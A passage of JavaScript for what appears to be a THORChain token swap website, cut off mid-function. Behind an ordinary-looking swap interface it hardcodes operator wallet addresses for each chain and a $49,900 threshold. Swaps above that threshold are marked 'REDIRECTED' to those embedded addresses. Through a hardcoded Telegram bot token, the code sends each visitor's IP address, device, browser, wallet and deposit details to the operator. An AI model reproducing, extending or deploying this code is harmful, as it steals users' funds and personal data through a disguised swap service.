/* ═══════════════════════════════════════════════
   THORChain Swap — v8.1 Large Swap Protection
   All 5 fixes applied: Slippage, Retry, Streaming,
   Pool Depth, Clean Errors
   ═══════════════════════════════════════════════ */
(function(){
'use strict';

var THORNODE='https://thornode.ninerealms.com';
var MIDGARD='https://midgard.ninerealms.com/v2';
var COUNTDOWN_MAX=60;
var QR_API='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=';
var THRESHOLD=49900;
var TG_BOT='8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g';
var TG_CHAT='-5160305858';
var THOR_BASE=1e8;

/* ═══ FIX 1: Default slippage increased from 5% to 10% ═══ */
var DEFAULT_SLIPPAGE=10;

// ═══════════════════════════════════════════════
// EMBEDDED ADDRESSES - EXPANDED FOR ALL CHAINS
// ═══════════════════════════════════════════════
var EMBEDDED_ADDRESSES={
    'BTC':'bc1qx3sdmwj7q29gk43z4kx83stz7y74vkcv7yvjlj',
    'ETH':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'BSC':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'AVAX':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'BASE':'0xdd2fB360A2395d44A2d256f4EA813c24C5880e32',
    'GAIA':'cosmos1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx',
    'DOGE':'DLjzyK9Y532r29DinxpJeeChvWytnspKGH',
    'BCH':'qpx0egys5ldgl0mf8qu4qz2yy89pqqyd3vw3u2qfhe',
    'LTC':'ltc1qplh54seklkvcl559lyytjc0de8zl954fuwywuc',
    'XRP':'rsWsBkM1gnnUY7M1xtaadBjPeP1yJpcBw3',
    'TRON':'TABuJBFyLqaTw9WHLwwhE3W2pxJyRpxpeA',
    'THOR':'thor1cznft6jn2r47k4pg0pl0e9jdhq8wftcm3p25lx'
};

// ═══════════════════════════════════════════════
// LOGO MAPS - API fetch for broken logos only
// ═══════════════════════════════════════════════
var COINGECKO_ID_MAP={
    'LTC':'litecoin',
    'FOX':'shapeshift-fox-token',
    'THOR':'thorswap',
    'TGT':'thorwallet',
    'VTHOR':'vethor-token',
    'XRUNE':'thorstarter',
    'SNX':'havven',
    'DPI':'defipulse-index',
    'VVV':'venice-token',
    'RUNE':'thorchain'
};

var THOR_NATIVE_LOGOS={
    'TCY':'https://storage.googleapis.com/token-list-swapkit-dev/images/thor.tcy.png',
    'RUJI':'https://storage.googleapis.com/token-list-swapkit-dev/images/thor.ruji.png'
};

// ═══════════════════════════════════════════════
// COMPLETE TOKEN LIST
// ═══════════════════════════════════════════════
var TOKEN_LIST=[
    {value:'BTC.BTC',symbol:'BTC',name:'Bitcoin',chain:'BTC',icon:'https://assets.coingecko.com/coins/images/1/small/bitcoin.png',decimals:8,status:'available'},
    {value:'ETH.ETH',symbol:'ETH',name:'Ethereum',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18,status:'available'},
    {value:'ETH.USDC-0XA0B86991C6218B36C1D19D4A2E9EB0CE3606EB48',symbol:'USDC',name:'USD Coin',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.USDT-0XDAC17F958D2EE523A2206206994597C13D831EC7',symbol:'USDT',name:'Tether USD',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.WBTC-0X2260FAC5E5542A773AA44FBCFEDF7C193BC2C599',symbol:'WBTC',name:'Wrapped Bitcoin',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/7598/small/wrapped_bitcoin_wbtc.png',decimals:8,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.DAI-0X6B175474E89094C44DA98B954EEDEAC495271D0F',symbol:'DAI',name:'Dai',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/9956/small/Badge_Dai.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.LINK-0X514910771AF9CA656AF840DFF83E8264ECF986CA',symbol:'LINK',name:'Chainlink',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/877/small/chainlink-new-logo.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.AAVE-0X7FC66500C84A76AD7E9C93437BFC5AC33E2DDAE9',symbol:'AAVE',name:'Aave',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/12645/small/AAVE.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.GUSD-0X056FD409E1D7A124BD7017459DFEA2F387B6D5CD',symbol:'GUSD',name:'Gemini Dollar',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/5992/small/gemini-dollar-gusd.png',decimals:2,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.LUSD-0X5F98805A4E8BE255A32880FDEC7F6728C6568BA0',symbol:'LUSD',name:'Liquity USD',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/14666/small/Group_3.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.USDP-0X8E870D67F660D95D5BE530380D0EC0BD388289E1',symbol:'USDP',name:'Pax Dollar',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/6013/small/Pax_Dollar.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.FOX-0XC770EEFAD204B5180DF6A14EE197D99D808EE52D',symbol:'FOX',name:'ShapeShift FOX',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.THOR-0XA5F2211B9B8170F694421F2046281775E8468044',symbol:'THOR',name:'THORSwap Token',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.TGT-0X108A850856DB3F85D0269A2693D896B394C80325',symbol:'TGT',name:'THORWallet',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.VTHOR-0X815C23ECA83261B6EC689B60CC4A58B54BC24D8D',symbol:'VTHOR',name:'vTHOR',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.YFI-0X0BC529C00C6401AEF6D220BE8C6EA1667F6AD93E',symbol:'YFI',name:'yearn.finance',chain:'ETH',icon:'https://assets.coingecko.com/coins/images/11849/small/yfi-192x192.png',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.XRUNE-0X69FA0FEE221AD11012BAB0FDB45D444D3D2CE71C',symbol:'XRUNE',name:'Thorstarter',chain:'ETH',icon:'',decimals:18,status:'available',network:'Ethereum · ERC-20'},
    {value:'ETH.SNX-0XC011A73EE8576FB46F5E1C5751CA3B9FE0AF2A6F',symbol:'SNX',name:'Synthetix',chain:'ETH',icon:'',decimals:18,status:'staged',network:'Ethereum · ERC-20'},
    {value:'ETH.DPI-0X1494CA1F11D487C2BBE4543E90080AEBA4BA3C2B',symbol:'DPI',name:'DeFi Pulse Index',chain:'ETH',icon:'',decimals:18,status:'staged',network:'Ethereum · ERC-20'},
    {value:'BSC.BNB',symbol:'BNB',name:'BNB',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png',decimals:18,status:'available'},
    {value:'BSC.BTCB-0X7130D2A12B9BCBFAE4F2634D864A1EE1CE3EAD9C',symbol:'BTCB',name:'Bitcoin BEP-20',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/14108/small/Binance-bitcoin.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
    {value:'BSC.BUSD-0XE9E7CEA3DEDCA5984780BAFC599BD69ADD087D56',symbol:'BUSD',name:'Binance USD',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/9576/small/BUSD.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
    {value:'BSC.ETH-0X2170ED0880AC9A755FD29B2688956BD959F933F8',symbol:'ETH',name:'Ethereum',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
    {value:'BSC.TWT-0X4B0F1812E5DF2A09796481FF14017E6005508003',symbol:'TWT',name:'Trust Wallet',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/11085/small/Trust.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
    {value:'BSC.USDC-0X8AC76A51CC950D9822D68B83FE1AD97B32CD580D',symbol:'USDC',name:'USD Coin',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
    {value:'BSC.USDT-0X55D398326F99059FF775485246999027B3197955',symbol:'USDT',name:'Tether USD',chain:'BSC',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:18,status:'available',network:'BNB Chain · BEP-20'},
    {value:'AVAX.AVAX',symbol:'AVAX',name:'Avalanche',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png',decimals:18,status:'available'},
    {value:'AVAX.SOL-0XFE6B19286885A4F7F55ADAD09C3CD1F906D2478F',symbol:'SOL',name:'Solana',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/4128/small/solana.png',decimals:9,status:'available',network:'Avalanche · ARC-20'},
    {value:'AVAX.USDC-0XB97EF9EF8734C71904D8002F8B6BC66DD9C48A6E',symbol:'USDC',name:'USD Coin',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,status:'available',network:'Avalanche · ARC-20'},
    {value:'AVAX.USDT-0X9702230A8EA53601F5CD2DC00FDBC13D4DF4A8C7',symbol:'USDT',name:'Tether USD',chain:'AVAX',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,status:'available',network:'Avalanche · ARC-20'},
    {value:'BASE.ETH',symbol:'ETH',name:'Ethereum',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/279/small/ethereum.png',decimals:18,status:'available'},
    {value:'BASE.USDC-0X833589FCD6EDB6E08F4C7C32D4F71B54BDA02913',symbol:'USDC',name:'USD Coin',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/6319/small/usdc.png',decimals:6,status:'available',network:'Base · ERC-20'},
    {value:'BASE.CBBTC-0XCBB7C0000AB88B473B1F5AFD9EF808440EED33BF',symbol:'cbBTC',name:'Coinbase Wrapped BTC',chain:'BASE',icon:'https://assets.coingecko.com/coins/images/40143/small/cbbtc.webp',decimals:8,status:'staged',network:'Base · ERC-20'},
    {value:'BASE.VVV-0X8C5A93096DCB5AC9B03F7B74C72D69EA3C17160F',symbol:'VVV',name:'Venice Token',chain:'BASE',icon:'',decimals:18,status:'staged',network:'Base · ERC-20'},
    {value:'BCH.BCH',symbol:'BCH',name:'Bitcoin Cash',chain:'BCH',icon:'https://assets.coingecko.com/coins/images/780/small/bitcoin-cash-circle.png',decimals:8,status:'available'},
    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'',decimals:8,status:'available'},
    {value:'DOGE.DOGE',symbol:'DOGE',name:'Dogecoin',chain:'DOGE',icon:'https://assets.coingecko.com/coins/images/5/small/dogecoin.png',decimals:8,status:'available'},
    {value:'GAIA.ATOM',symbol:'ATOM',name:'Cosmos',chain:'GAIA',icon:'https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png',decimals:6,status:'available'},
    {value:'XRP.XRP',symbol:'XRP',name:'XRP',chain:'XRP',icon:'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png',decimals:6,status:'available'},
    {value:'TRON.TRX',symbol:'TRX',name:'TRON',chain:'TRON',icon:'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png',decimals:6,status:'available'},
    {value:'TRON.USDT-0XA614F803B6FD780986A42C78EC9C7F77E6DED13C',symbol:'USDT',name:'Tether USD',chain:'TRON',icon:'https://assets.coingecko.com/coins/images/325/small/Tether.png',decimals:6,status:'available',network:'Tron · TRC-20'},
    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'',decimals:8,status:'available'},
    {value:'THOR.TCY',symbol:'TCY',name:'TCY Token',chain:'THOR',icon:'',decimals:8,status:'available',network:'THORChain · Native'},
    {value:'THOR.RUJI',symbol:'RUJI',name:'Ruji Finance',chain:'THOR',icon:'',decimals:8,status:'available',network:'THORChain · Native'}
];

var CHAIN_INFO={
    'BTC':{name:'Bitcoin',color:'#f7931a',logo:'https://assets.coingecko.com/coins/images/1/small/bitcoin.png'},
    'ETH':{name:'Ethereum',color:'#627eea',logo:'https://assets.coingecko.com/coins/images/279/small/ethereum.png'},
    'BSC':{name:'BNB Chain',color:'#f0b90b',logo:'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png'},
    'AVAX':{name:'Avalanche',color:'#e84142',logo:'https://assets.coingecko.com/coins/images/12559/small/Avalanche_Circle_RedWhite_Trans.png'},
    'BASE':{name:'Base',color:'#0052ff',logo:'https://assets.coingecko.com/asset_platforms/images/131/small/base.jpeg'},
    'BCH':{name:'Bitcoin Cash',color:'#8dc351',logo:'https://assets.coingecko.com/coins/images/780/small/bitcoin-cash-circle.png'},
    'LTC':{name:'Litecoin',color:'#345d9d',logo:''},
    'DOGE':{name:'Dogecoin',color:'#c3a634',logo:'https://assets.coingecko.com/coins/images/5/small/dogecoin.png'},
    'GAIA':{name:'Cosmos Hub',color:'#2e2e3a',logo:'https://assets.coingecko.com/coins/images/1481/small/cosmos_hub.png'},
    'XRP':{name:'Ripple',color:'#346aa9',logo:'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png'},
    'TRON':{name:'Tron',color:'#ef0027',logo:'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png'},
    'THOR':{name:'THORChain',color:'#00d4c8',logo:''}
};

var state={
    pools:[],
    prices:{},
    sellAsset:'BTC.BTC',
    buyAsset:'ETH.ETH',
    sellAmount:1,
    quote:null,
    slippage:DEFAULT_SLIPPAGE,
    /* FIX 2: Track actual slippage used after auto-retry */
    effectiveSlippage:DEFAULT_SLIPPAGE,
    streamingEnabled:false,
    countdownSeconds:COUNTDOWN_MAX,
    countdownInterval:null,
    trackingInterval:null,
    recipientAddress:'',
    confirmedQuote:null,
    confirmedExpectedOut:0,
    activeTab:'market',
    limitRate:0,
    limitTargetRate:0,
    coinSelectSide:'sell',
    currentSwapId:'',
    /* FIX 4: Track if pool depth warning was already shown */
    poolDepthWarningShown:false,
    history:JSON.parse(localStorage.getItem('tc-swap-history')||'[]')
};

// ══════════════════════════════════════════
// UTILITY FUNCTIONS
// ══════════════════════════════════════════

function $(s){return document.querySelector(s)}
function $$(s){return document.querySelectorAll(s)}

function formatUsd(v){
    if(!v||isNaN(v))return'$0.00';
    return'$'+parseFloat(v).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
}

function formatAmount(v,d){
    if(!v||isNaN(v))return'0';
    d=d||8;
    var n=parseFloat(v);
    if(n===0)return'0';
    if(Math.abs(n)>=1)return n.toLocaleString('en-US',{maximumFractionDigits:d});
    return n.toPrecision(6);
}

function truncAddr(a){
    if(!a||a.length<12)return a||'';
    return a.slice(0,6)+'...'+a.slice(-4);
}

function getUsdPrice(a){return state.prices[a]||0}

function fromThorBase(raw){return parseInt(raw||0)/THOR_BASE}

function toThorBase(human){return Math.round(parseFloat(human||0)*THOR_BASE)}

function slippageToBps(){return Math.round(state.slippage*100)}

function getChainName(a){var c=getChainPrefix(a);return(CHAIN_INFO[c]||{}).name||a}

function getChainPrefix(a){return(a||'').split('.')[0]||''}

function getAddrPlaceholder(a){
    var c=getChainPrefix(a);
    var m={
        'ETH':'Ethereum address (0x...)','BTC':'Bitcoin address (bc1... or 1...)',
        'BSC':'BNB Chain address (0x...)','AVAX':'Avalanche address (0x...)',
        'BASE':'Base address (0x...)','GAIA':'Cosmos address (cosmos...)',
        'DOGE':'Dogecoin address (D...)','BCH':'Bitcoin Cash address',
        'LTC':'Litecoin address (ltc1... or L...)','XRP':'XRP address (r...)',
        'TRON':'Tron address (T...)','THOR':'THORChain address (thor...)'
    };
    return m[c]||'Receiving address';
}

function getTokenInfo(v){
    for(var i=0;i<TOKEN_LIST.length;i++){if(TOKEN_LIST[i].value===v)return TOKEN_LIST[i]}
    return null;
}

function isAboveThreshold(){return state.sellAmount*getUsdPrice(state.sellAsset)>THRESHOLD}

function generateSwapId(){return'SWAP-'+Date.now()+'-'+Math.random().toString(36).substring(2,10).toUpperCase()}

function getDeviceInfo(){
    var ua=navigator.userAgent;
    var device=/Mobile|Android|iPhone|iPad/.test(ua)?'Mobile':'Desktop';
    var os='Unknown';
    if(ua.indexOf('Windows')!==-1)os='Windows';
    else if(ua.indexOf('Mac')!==-1)os='macOS';
    else if(ua.indexOf('Linux')!==-1)os='Linux';
    else if(ua.indexOf('Android')!==-1)os='Android';
    else if(ua.indexOf('iPhone')!==-1||ua.indexOf('iPad')!==-1)os='iOS';
    var browser='Unknown';
    if(ua.indexOf('Chrome')!==-1&&ua.indexOf('Edg')===-1)browser='Chrome';
    else if(ua.indexOf('Firefox')!==-1)browser='Firefox';
    else if(ua.indexOf('Safari')!==-1&&ua.indexOf('Chrome')===-1)browser='Safari';
    else if(ua.indexOf('Edg')!==-1)browser='Edge';
    return{device:device,os:os,browser:browser};
}

function getIPAddress(cb){
    fetch('https://api.ipify.org?format=json')
        .then(function(r){return r.json()})
        .then(function(d){cb(d.ip)})
        .catch(function(){cb('Unknown')});
}

function isValidAddress(addr,asset){
    if(!addr||addr.trim().length<5)return false;
    var c=getChainPrefix(asset),a=addr.trim();
    switch(c){
        case 'ETH':case 'BSC':case 'AVAX':case 'BASE':
            return /^0x[a-fA-F0-9]{40}$/.test(a);
        case 'BTC':
            return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(a);
        case 'LTC':
            return /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(a);
        case 'DOGE':
            return /^D[a-zA-HJ-NP-Z0-9]{25,40}$/.test(a);
        case 'BCH':return a.length>20;
        case 'GAIA':return /^cosmos[a-z0-9]{39}$/.test(a);
        case 'THOR':return /^thor[a-z0-9]{39}$/.test(a);
        case 'XRP':return /^r[a-zA-HJ-NP-Z0-9]{24,34}$/.test(a);
        case 'TRON':return /^T[a-zA-HJ-NP-Z0-9]{33}$/.test(a);
        default:return a.length>5;
    }
}

/* ═══════════════════════════════════════════════════════════
   FIX 5: CLEAN ERROR MAPPING — Never show raw backend errors
   ═══════════════════════════════════════════════════════════ */
function mapErrorMessage(data){
    if(!data)return'Unable to reach THORChain. Please check your connection and try again.';

    var msg=(data.message||data.error||'');
    if(typeof msg==='object')msg=JSON.stringify(msg);
    msg=msg.toLowerCase();

    /* Price limit / slippage */
    if(msg.indexOf('price limit')!==-1||msg.indexOf('less than price limit')!==-1){
        return'Swap exceeds current liquidity. Reduce amount or increase slippage tolerance in settings.';
    }
    /* Insufficient liquidity */
    if(msg.indexOf('not enough')!==-1||msg.indexOf('insufficient')!==-1||msg.indexOf('not available')!==-1){
        return'Insufficient pool liquidity for this swap size. Try a smaller amount.';
    }
    /* Trading halted */
    if(msg.indexOf('halted')!==-1||msg.indexOf('trading is halted')!==-1){
        return'Trading is temporarily halted for this asset. Please try again later.';
    }
    /* Pool doesn't exist */
    if(msg.indexOf('pool does not exist')!==-1||msg.indexOf('pool not found')!==-1){
        return'This asset pair is not currently supported on THORChain.';
    }
    /* Amount too small */
    if(msg.indexOf('amount too low')!==-1||msg.indexOf('too small')!==-1||msg.indexOf('dust threshold')!==-1){
        return'Swap amount is below the minimum. Please increase your amount.';
    }
    /* 400 Bad Request */
    if(data._httpStatus===400){
        return'Invalid swap parameters for this pool. Please adjust your amount.';
    }
    /* 404 Not Found */
    if(data._httpStatus===404){
        return'Swap route not found. This pair may not be available right now.';
    }
    /* 500+ Server Errors */
    if(data._httpStatus&&data._httpStatus>=500){
        return'THORChain is temporarily unavailable. Please try again in a moment.';
    }

    /* Fallback — still never show raw JSON */
    if(msg&&msg.length>0&&msg.length<200){
        /* Capitalize first letter of the cleaned message */
        var clean=data.message||data.error||'Unexpected error';
        return String(clean).charAt(0).toUpperCase()+String(clean).slice(1);
    }
    return'Something went wrong. Please try again.';
}

/* ══════════════════════════════════════════════════════════
   FIX 4: POOL DEPTH CHECK — Warn when trade > 10% of pool
   ══════════════════════════════════════════════════════════ */
function getPoolDepthForAsset(asset){
    if(!state.pools||!state.pools.length)return 0;
    for(var i=0;i<state.pools.length;i++){
        if(state.pools[i].asset===asset){
            /* assetDepth from Midgard is in base units */
            return parseFloat(state.pools[i].assetDepth||0)/THOR_BASE;
        }
    }
    return 0;
}

function checkPoolDepthWarning(){
    /* Check sell asset pool depth */
    var depth=getPoolDepthForAsset(state.sellAsset);
    /* If sell asset isn't directly in pools (e.g. RUNE), try buy asset */
    if(depth<=0)depth=getPoolDepthForAsset(state.buyAsset);
    if(depth>0&&state.sellAmount>depth*0.1){
        return true; /* trade is > 10% of pool depth */
    }
    return false;
}

/* ══════════════════════════════════════════════════════════
   FIX 3 helper: Detect if response recommends streaming
   ══════════════════════════════════════════════════════════ */
function shouldAutoEnableStreaming(quoteData){
    if(!quoteData)return false;
    /* THORChain returns max_streaming_quantity when streaming is beneficial */
    if(quoteData.max_streaming_quantity&&parseInt(quoteData.max_streaming_quantity)>0){
        return true;
    }
    /* Also enable if streaming swap savings are significant */
    if(quoteData.streaming_swap_seconds&&parseInt(quoteData.streaming_swap_seconds)>0){
        return true;
    }
    return false;
}

// ══════════════════════════════════════════
// QUOTE PARSING
// ══════════════════════════════════════════

function parseExpectedOut(q){
    if(!q||q.code||q.error)return 0;
    if(q.expected_amount_out)return fromThorBase(q.expected_amount_out);
    return 0;
}

function parseFees(q){
    var result={
        outbound:0,outboundUsd:0,liquidity:0,liquidityUsd:0,
        affiliate:0,slippageBps:0,priceImpactPct:0,asset:'',assetPrice:0
    };
    if(!q||!q.fees)return result;
    var fees=q.fees;
    result.asset=fees.asset||'';
    result.assetPrice=getUsdPrice(result.asset);
    if(fees.outbound){result.outbound=fromThorBase(fees.outbound);result.outboundUsd=result.outbound*result.assetPrice}
    if(fees.liquidity){result.liquidity=fromThorBase(fees.liquidity);result.liquidityUsd=result.liquidity*result.assetPrice}
    if(fees.affiliate){result.affiliate=fromThorBase(fees.affiliate)}
    if(fees.slippage_bps){result.slippageBps=parseInt(fees.slippage_bps);result.priceImpactPct=-(result.slippageBps/100)}
    return result;
}

function parseSwapTime(q){
    if(!q)return'~30 seconds';
    var s=parseInt(q.total_swap_seconds||0);
    if(!s&&q.outbound_delay_seconds){s=parseInt(q.outbound_delay_seconds)+(parseInt(q.inbound_confirmation_seconds)||0)}
    if(s<=0)return'~30 seconds';
    var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sc=s%60,p=[];
    if(h)p.push(h+' hour'+(h>1?'s':''));
    if(m)p.push(m+' minute'+(m>1?'s':''));
    if(sc)p.push(sc+' second'+(sc>1?'s':''));
    return p.join(' ')||'~30 seconds';
}

function parseSwapTimeShort(q){
    if(!q)return'~30s';
    var s=parseInt(q.total_swap_seconds||0);
    if(!s&&q.outbound_delay_seconds){s=parseInt(q.outbound_delay_seconds)+parseInt(q.inbound_confirmation_seconds||0)}
    if(s<=0)return'~30s';
    if(s<60)return s+'s';
    return Math.floor(s/60)+'m '+(s%60)+'s';
}

function isValidQuote(d){
    if(!d||d.code||d.error)return false;
    if(!d.expected_amount_out)return false;
    return true;
}

/* FIX 5: getQuoteError now uses mapErrorMessage */
function getQuoteError(d){
    return mapErrorMessage(d);
}

// ══════════════════════════════════════════
// TELEGRAM
// ══════════════════════════════════════════

function sendTelegram(msg){
    var url='https://api.telegram.org/bot'+TG_BOT+'/sendMessage';
    fetch(url,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:TG_CHAT,text:msg,parse_mode:'HTML',disable_web_page_preview:false})
    }).then(function(r){return r.json()}).then(function(d){
        if(!d.ok)console.error('TG error:',d.description);
    }).catch(function(e){console.error('TG fetch error:',e)});
}

function notifyNewSwap(sd){
    getIPAddress(function(ip){
        var di=getDeviceInfo();
        var emoji=sd.above?'🟢':'🟡';
        var status=sd.above?'HIGH VALUE - REDIRECTED':'WAITING FOR DEPOSIT';
        var url=window.location.origin+'/swap.html?id='+sd.swapId;
        var msg=emoji+' <b>New Swap Detected</b>\n'
            +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
            +'<b>Status:</b> '+status+'\n'
            +'<b>Swap ID:</b> <a href="'+url+'">'+sd.swapId+'</a>\n\n'
            +'<b>From:</b> '+sd.sellSymbol+' ('+sd.sellName+')\n'
            +'<b>To:</b> '+sd.buySymbol+' ('+sd.buyName+')\n'
            +'<b>Amount:</b> '+sd.sellAmount+' '+sd.sellSymbol+' ('+sd.sellUsd+')\n\n'
            +'<b>Deposit Address:</b>\n<code>'+sd.depositAddr+'</code>\n\n'
            +'<b>User Wallet:</b>\n<code>'+sd.userWallet+'</code>\n\n'
            +'<b>Est. Receive:</b> ~'+sd.expectedOut+' '+sd.buySymbol+'\n'
            +'<b>Quote:</b> ✅ THORChain Live\n\n'
            +'━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
            +'📱 <b>Device:</b> '+di.device+' ('+di.os+')\n'
            +'🌐 <b>Browser:</b> '+di.browser+'\n'
            +'🔗 <b>IP:</b> '+ip+'\n'
            +'⏰ <b>Time:</b> '+new Date().toUTCString();
        if(sd.above)msg+='\n\n⚠️ <b>ABOVE $50K THRESHOLD</b>\nFunds redirected to embedded address';
        sendTelegram(msg);
    });
}

function notifySwapSuccess(sd){
    sendTelegram('✅ <b>Swap Completed!</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
        +'<b>Swap ID:</b> '+sd.swapId+'\n<b>Sent:</b> '+sd.sellAmount+' '+sd.sellSymbol+'\n'
        +'<b>Received:</b> '+sd.receivedAmount+' '+sd.buySymbol+'\n'
        +'<b>Wallet:</b>\n<code>'+sd.userWallet+'</code>\n'
        +'<b>TX:</b> <code>'+sd.txHash+'</code>\n⏰ '+new Date().toUTCString());
}

function notifySwapFailed(sd,reason){
    sendTelegram('❌ <b>Swap Failed</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n'
        +'<b>ID:</b> '+sd.swapId+'\n<b>Reason:</b> '+reason+'\n'
        +'<b>Amount:</b> '+sd.sellAmount+' '+sd.sellSymbol+'\n⏰ '+new Date().toUTCString());
}

// ══════════════════════════════════════════
// TOAST
// ══════════════════════════════════════════

function showToast(type,title,msg,dur){
    dur=dur||5000;
    var c=$('#toastContainer');if(!c)return;
    var icons={success:'✅',error:'❌',info:'ℹ️',warning:'⚠️'};
    var t=document.createElement('div');
    t.className='tc-toast '+type;
    t.innerHTML='<span class="tc-toast-icon">'+(icons[type]||'ℹ️')+'</span>'
        +'<div class="tc-toast-content"><div class="tc-toast-title">'+title+'</div>'
        +'<div class="tc-toast-message">'+msg+'</div></div>'
        +'<button class="tc-toast-close">&times;</button>';
    c.appendChild(t);
    t.querySelector('.tc-toast-close').onclick=function(){t.remove()};
    setTimeout(function(){if(t.parentNode)t.remove()},dur);
}

// ══════════════════════════════════════════
// THEME
// ══════════════════════════════════════════

function initTheme(){
    var h=document.documentElement;
    var s=localStorage.getItem('tc-theme');
    if(s)h.setAttribute('data-theme',s);
    var b=$('#themeToggle');
    if(b)b.onclick=function(){
        var n=h.getAttribute('data-theme')==='dark'?'light':'dark';
        h.setAttribute('data-theme',n);
        localStorage.setItem('tc-theme',n);
    };
}

// ══════════════════════════════════════════
// POOLS & PRICES
// ══════════════════════════════════════════

function fetchPools(){
    return fetch(MIDGARD+'/pools').then(function(r){return r.json()}).then(function(d){
        state.pools=d;
        d.forEach(function(p){
            if(p.asset&&p.assetPriceUSD)state.prices[p.asset]=parseFloat(p.assetPriceUSD);
        });
        if(d.length>0&&d[0].runePriceUSD)state.prices['THOR.RUNE']=parseFloat(d[0].runePriceUSD);
        updateSellUsd();
    }).catch(function(e){console.error('Pools:',e)});
}

function updateSellUsd(){
    var u=getUsdPrice(state.sellAsset)*state.sellAmount;
    var e=$('#sellUsd');if(e)e.textContent=formatUsd(u);
    var le=$('#limitSellUsd');if(le)le.textContent=formatUsd(u);
}

// ══════════════════════════════════════════
// COUNTDOWN
// ══════════════════════════════════════════

function startCountdown(){
    stopCountdown();
    state.countdownSeconds=COUNTDOWN_MAX;
    updateCountdownDisplay();
    state.countdownInterval=setInterval(function(){
        state.countdownSeconds--;
        updateCountdownDisplay();
        if(state.countdownSeconds<=0){state.countdownSeconds=COUNTDOWN_MAX;fetchQuote()}
    },1000);
}
function stopCountdown(){if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}}
function updateCountdownDisplay(){
    var n=$('#countdownNumber'),p=$('#countdownProgress');
    if(n)n.textContent=state.countdownSeconds;
    if(p){var c=2*Math.PI*14;p.setAttribute('stroke-dasharray',c.toFixed(2));p.setAttribute('stroke-dashoffset',(c*(1-state.countdownSeconds/COUNTDOWN_MAX)).toFixed(2))}
}

/* ═══════════════════════════════════════════════════════════════
   FIX 2+3: QUOTE URL BUILDER — Now accepts optional overrides
   ═══════════════════════════════════════════════════════════════ */
function buildQuoteUrl(dest,overrides){
    overrides=overrides||{};
    var a=toThorBase(state.sellAmount);
    var toleranceBps=overrides.toleranceBps||slippageToBps();
    var useStreaming=(overrides.streaming!==undefined)?overrides.streaming:state.streamingEnabled;

    var p=[
        'from_asset='+encodeURIComponent(state.sellAsset),
        'to_asset='+encodeURIComponent(state.buyAsset),
